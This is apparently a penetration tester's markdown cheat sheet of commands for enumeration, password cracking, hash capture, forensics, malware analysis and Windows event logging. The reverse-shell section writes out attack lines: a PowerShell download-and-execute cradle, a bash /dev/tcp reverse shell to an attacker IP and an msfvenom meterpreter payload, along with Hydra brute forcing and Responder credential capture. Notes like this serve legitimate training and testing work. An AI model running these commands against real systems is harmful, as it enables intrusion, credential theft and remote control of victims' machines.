# Contents

- [Enumeration](#ENUMERATION)

- [BruteForcing](#BruteForcing)

- [Encryption/Decryption](#EncryptionDecryption)

- [Privilege Escalation](#privilege-esclation)

- [Windows Commands](#Windows-Commands)

- [Metasploit](#Metasploit)

- [TextEditing/Processing](#Text-EditingProcessing)

- [Reverse Shells & Servers](#Reverse-Shells--Servers)

- [Technologies & Protocols](#Technologies--Protocols)

- [Forensics](#Forensics)

- [Malware Investigations](#Malware-Investigations)

- [Incident Response](#Incident-Response)

- [Windows Event Logging](#Windows-Event-Logging)

- [Misc](#Misc)


# ENUMERATION

#### NMAP

Default scripts, enumerate version, o/p all formats called namp.\* and target IP

```
nmap -sC -sV -oA nmap <IP>
```

Scan all ports

```
nmap -p- <IP>
```

#### NETCAT

Quick check if port is open. -z connect and disconnect, -v verbose

```
nc -zv <IP> 
```

#### GOBUSTER

- Brute force a web drectroy to find all valid pages

```
gobuster dir -u <URL> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o <output_file>

```

- Brute force a web drectroy and append a forward slash + output page size

```
gobuster dir -u <URL> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -f -l

```
 

- Loop to brute force multiple web directories. Example

```
for i in admin dev test backup loop; do gobuster dir -u <URL>/${i} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gob; done
```
  
#### SEARCHSPLOIT

- Copy exploit script/data to current directory

```
searchsploit -m <exploit number>
```


#### SMB

list shares

```
smbclient -L <IP>
```

list shares

```
smbmap -H <IP>
```

Browse to a particular share

```
smbclient //IP/Path
```
#### FTP

- Mirror contents of FTP share to local machine via anon login.

```
wget -m --no-passive ftp://anonymous:anonymous@<IP>
```
  
#### DNS ZONE TRANSFER

Transfer a copy of DNS records to local machine

```
dig axfr domain name @ IP
```
#### Hosts file

```
/etc/hosts

```

#### WordPress

- WordPress enumeration

```
wpscan --url <IP> -e vt,tt,u,ap --log wpscan.log

```

  
#### WORDLISTS

- Crawl a site and create a wordlist

```
cewl <URL> -w Results.txt

```

```
/usr/share/seclists
```

```
/usr/share/wordlist/rockyou.txt
```
# Capturing Credentials

#### Responder

- Get victim machine to authenticate back to attacking machine via sqli(xp_dirtree) or other means and use Responder to capture the hash.

```
responder -I <IP>
```

# BruteForcing

#### John The Ripper

- Brute force a zip file after converting it to a hash using zip2john.

```
john --wordlist=/usr/share/wordlist/rockyou.txt <file.hash> 
```

#### Converting ssh key to JTR crackable format

```
./ssh2john <id_rsa> >> <outputfile.txt>
```

#### HYDRA

- BruteForce a login page when only the username is known. ^USER^ and ^PASS^ are variables in HYDRA. Capture the request string using BURP

```
hydra -l <USERNAME> -P rockyou-50.txt <IP> http-post-form "<Path_To_Login_page>:username=^USER^&password=^PASS^:<Whatever the error msg is for wrong creds>"
```

#### WFUZ

- Fuzz login credentials with part of the password known. -d flag specifies postdata. 

```
wfuzz -u http://<IP>/login/index.php -d 'anchor=&username=user&password=passwordFUZZ' -w /usr/share/seclists/Fuzzing/special-chars.txt 
```
# Encryption/Decryption

##### BASE64

Decode a base64 file from terminal

```
base64 -d <file_name.txt>
```

##### BASE16

Decode a base16 file and output it to t new file

```
cat index.php | xxd -r -p > filename.txt
```

# Privilege Esclation

#### Secure Copy using ssh key 

```
scp -i </path/to/id_rsa> <FiletoCopy.txt> user@x.x.x.x:/path/to/copy/file/to/filename.txt


```

#### SSH General

- .ssh/authorized_keys (Server) – contains the public keys of any authorised clients who can connect.
- .ssh/id_rsa – (Client) - Contains the private key for the client who whishes to connect to the server.
- .ssh/id_rsa.pub (Client) – Contains the public key for the client.

#### SSH Connect using private key

```
ssh -i mykey user@<IP>
```


# Windows Commands

#### Windows exploit suggester

```
run systeminfo on victim machine and save to systeminfo.txt

python windows-exploit-suggester.py -d <latest secuity bulliten .xls> -i <systeminfo.txt>
```

#### List drive letters currently in use

```
wmic logicaldisk get name

```

#### List mapped drives

```
net use
```

#### Mapping network drives

```
net use z: \\remotepc\sharename
```

#### Disconnecting network drives

```
net use z: /delete
```

### Mapping C drive of remote machine (admin access required)

```
net use \\remotepc\C$ /u:username password
```

# Metasploit

#### Copy a module into metsploit

```
cp /usr/share/exploitdb/exploits/multiple/remote/<EXPLOIT.rb> /root/.msf4/modules/

```



# Text Editing/Processing

#### REMOVING ALL WHITESPACES

```
tr -d ' ' < random.txt > random_nospace.txt 
```

# Reverse Shells & Servers

#### SIMPLE HTTP SERVER

Simple HTTP server to host files on attacking machine

```
python -m SimpleHTTPServer 80
```

#### Powershell to download file from attacking machine and run on victim machine.

```
powershell "IEX(New-Object Net.WebClient).DownloadString('http://IP:80/<File>')"
```

#### BASH REVERSE SHELL ONE LINER

Execute on target machine. Bash -c indicates bash command in case you are in another non bash shell

```
bash -c 'bash -i >& /dev/tcp/ATTACKING IP/PORT 0>&1'

```

#### UPGRADING A DUMB SHELL

- Make the shell interactive, tab completion etc.
```
python -c 'import pty; pty.spawn("/bin/bash")'
CTRL + Z
stty raw -echo
fg <ENTER> <ENTER>

```

- alow clearing of the terminal using clear

```
export TERM=xterm
```

#### Perl shell

```
echo 'exec("/bin/bash");' >> shell.pl
sudo perl shell.pl
```
#### Meterpreter reverse shell

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Attackers_IP> LPORT=<Attackers_Port> -f <file type e.g. exe> > <name.exe>

```



# Technologies & Protocols

#### TOMCAT

- Tomcat is a type of web server used to serve web applications developed in Java built to the java Servlet specification.

#### APACHE

- Apache is an open source free web server software. 

#### HTTP

ERROR CODES

- 1xx: Info
- 2xx: Sucess
- 3xx: Redirect
- 4xx: Client side
- 5xx: Server side

METHODS
 
- Get: Read only method used to retrieve information from a server using a URI.
- Post: General purpose send data to a server e.g. an image to be uploaded.
- Put: Replaces the current target resource with the new uploaded content.
- Delete: Remove some information contained on the server.

HEADERS: Extra Meta information sent by the client to ensure requests are processed correctly. 

- Language
- Chareacter set
- Content type
- Cookies

BODY: (Optional) Core data sent to server to process the request.

- Data in which the client is sending to the server.

#### WAF

- A WAF is a type of reverse proxy that protects a web server running web applications by having external clients pass through the WAF before reaching the server. A WAF filters and monitors http traffic protecting against xxs, lfi, sqli etc.
A WAF is different from a network FW n that it operates at layer 7 as opposed to layer 3/4. Network firewalls filter based on IP, Port etc where as WAF's look at the content of the http requests (L 7).

#### DNS

- Resolves domain names into IP addresses

- Steps
  - Recursive name server (ISP/Public e.g google)
  - Root Servers: 13 placed stategically around the world. Manages requests for tld's e.g. .com, .org etc.
  - TLD Server: e.g .com
  - Authorative Name Server: Contains IP's for the particular domain e.g. .com

- Clear DNS cache on windows

```
ipconfig/flushdns
```

#### SSH

- ssh syntax

```
ssh username@IPAddress
```

# Forensics

#### Sleuthkit

- Determine Partition Information
```
mmls image_name.dd
```

- File system statistics. Indicates type of file system and information about it
```
fsstat -o offset image_name.dd
```

- List all the files recursively
```
fls -r -o offset image_name.dd
```

- get file metadat e\.g\. MAC times etc\. 
```
istat -o offset image_name.dd identifying number
```


- revover contents of a file and o/p to a file named recovered\.jpg
```
icat -o offset image_name.dd identifying number > recovered.jpg
```

#### Stego

- extract hidden data from an image (Password known)

```
steghide extract -sf image.jpg -p <password>
```

#### File Compression/Extraction

- Use 7zip to list contents of zip file and show technical info e.g. encryption used.

```
7z l -slt Access\ target.zip
```

- convert zip file to john the ripper format

```
zip2john target.zip
```


# Malware Investigations

#### 5 Steps of Malware Analysis

- 1: Static Analysis
- 2: Blackboxing
- 3: Internet Search
- 4: Whitboxing
- 5: Results

#### Compilation Process

- Source Code: Human readable e\.g\. C code 

- Object Files: Binary code with readable symbols

- Executable: Binary code without readable symbols

- Decompiling: usually very difficult so dissasembly is used instead

- Dissasembly: transforms the binary executable into readable assembly code

 #### x86 Assembly
 
 - load effective address. used to save an adress and add values in one instuction.
 
 ```
 LEA EAX, [EBX+1]
 ```
 
- Setting a value to zero with XOR is move efficient than using MOV
 
```
XOR EAX, EAX
```
 
- mul multiples al, ax or eax by <src>. Results stored in ax, dx:ax or edx:eax
  
```
MUL <src>
```

- Test performs a Binary AND function on the src and dest. It only chnages status Flags.

```
TEST EAX,EBX
```

- CMP performs a SUB on both operands and sets the appropriate Flags.

```
CMP EBX, EAX
```

- Scan string compares values in EDI to AL,AX or EAX. Sets appropriate flags (ZF). Inc/Dec EDI 1 if DF=0/1.

- Rep instruction repeats using ECX as a counter. After each rep ECX is decremented.

```
repne scasb
```

# Incident Response

#### 7 steps of Incident Response

- Detection
- Response
- Mitigation
- Reporting
- Recovery
- Remediation
- Lessons learned


# Windows Event Logging

#### 6 most important event ID's to monitor

- 4688/592: New process executed, look for obvious .exe's (csript.exe, sysprep.exe, psexec.exe, oddname.exe)

- 4624/528/540: Account Logged in

- 5140/560: Share was accessed, most likely C$

- 5156: Windows	Firewall	Network	connecOon	by	process.	Can	see	the	process	connect	to	an	external IP

- 7045/601: New Service installed. Normal systems only get new services installed at patch time.

- 4663/567: New File/Reg creation. File auditing must be enabled.



# Misc

#### Useful Linux Commands

- Include 10 lines above and below search term using grep

```
grep -c 10 
```

- Check privileges of current shell

```
id
```
- Find a particular file

```
locate <filename>

```

#### Useful Windows Commands

- Cat equiv in windows

```
more
```

- List all files in windows

```
dir /aihd
```

#### Powershell

- list files in current directory

```
Get-ChildItem
```
```
gci
```

```
ls
```

- View services
```
Get-Service
```
- Object which is populated which the current item thats in the pipline. 

```
$_

```
- Example of using $_

```
Get-Service | Where-Object {$_.DisplayName -match "MS"}
```

- Current running processes

```
Get-Process
```























